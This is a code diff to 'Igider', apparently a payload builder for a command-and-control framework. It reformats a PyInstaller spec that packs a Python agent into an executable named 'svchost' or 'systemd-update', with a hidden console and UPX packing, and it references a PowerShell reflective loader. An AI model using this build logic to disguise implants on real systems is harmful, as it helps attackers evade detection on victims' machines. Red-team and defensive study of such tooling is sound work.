@@ -17,6 +17,8 @@ import logging
 from typing import Dict, Any, List, Optional
 from itertools import cycle
 import datetime
+import textwrap
+
 
 class Igider(PayloadType):
     name = "igider"
@@ -137,53 +139,54 @@ class Igider(PayloadType):
     
     def _create_pyinstaller_spec(self, code: str, target_os: str) -> str:
         """Generate PyInstaller spec file for executable creation."""
-        spec_content = f"""
-    # -*- mode: python ; coding: utf-8 -*-
+        spec_content = textwrap.dedent(f"""
+            # -*- mode: python ; coding: utf-8 -*-
 
-    block_cipher = None
+            block_cipher = None
 
-    a = Analysis(
-        ['main.py'],
-        pathex=[],
-        binaries=[],
-        datas=[],
-        hiddenimports=['urllib.request', 'urllib.parse', 'ssl', 'json', 'base64', 'threading', 'time'],
-        hookspath=[],
-        hooksconfig={{}},
-        runtime_hooks=[],
-        excludes=[],
-        win_no_prefer_redirects=False,
-        win_private_assemblies=False,
-        cipher=block_cipher,
-        noarchive=False,
-    )
+            a = Analysis(
+                ['main.py'],
+                pathex=[],
+                binaries=[],
+                datas=[],
+                hiddenimports=['urllib.request', 'urllib.parse', 'ssl', 'json', 'base64', 'threading', 'time'],
+                hookspath=[],
+                hooksconfig={{}},
+                runtime_hooks=[],
+                excludes=[],
+                win_no_prefer_redirects=False,
+                win_private_assemblies=False,
+                cipher=block_cipher,
+                noarchive=False,
+            )
 
-    pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+            pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
 
-    exe = EXE(
-        pyz,
-        a.scripts,
-        a.binaries,
-        a.zipfiles,
-        a.datas,
-        [],
-        name='{"svchost" if target_os == "windows" else "systemd-update"}',
-        debug=False,
-        bootloader_ignore_signals=False,
-        strip=False,
-        upx=True,
-        upx_exclude=[],
-        runtime_tmpdir=None,
-        console={'False' if target_os == "windows" else 'True'},
-        disable_windowed_traceback=False,
-        argv_emulation=False,
-        target_arch=None,
-        codesign_identity=None,
-        entitlements_file=None,
-        {'icon="icon.ico",' if target_os == "windows" else ''}
-    )
-    """
+            exe = EXE(
+                pyz,
+                a.scripts,
+                a.binaries,
+                a.zipfiles,
+                a.datas,
+                [],
+                name='{"svchost" if target_os == "windows" else "systemd-update"}',
+                debug=False,
+                bootloader_ignore_signals=False,
+                strip=False,
+                upx=True,
+                upx_exclude=[],
+                runtime_tmpdir=None,
+                console={'False' if target_os == "windows" else 'True'},
+                disable_windowed_traceback=False,
+                argv_emulation=False,
+                target_arch=None,
+                codesign_identity=None,
+                entitlements_file=None,
+                {'icon="icon.ico",' if target_os == "windows" else ''}
+            )
+        """)
         return spec_content
+
 
     def _create_powershell_loader(self, python_code: str) -> str:
         """Create PowerShell reflective loader for Python agent."""
@@ -265,9 +268,8 @@ class Igider(PayloadType):
             
             try:
                 # Run PyInstaller
-                cmd = ["pyinstaller", "--onefile", "--distpath", temp_dir, spec_file]
-                if target_os == "windows":
-                    cmd.extend(["--noconsole"])
+                cmd = ["pyinstaller", spec_file]
+               
                 
                 result = subprocess.run(cmd, capture_output=True, text=True, cwd=temp_dir)
                 
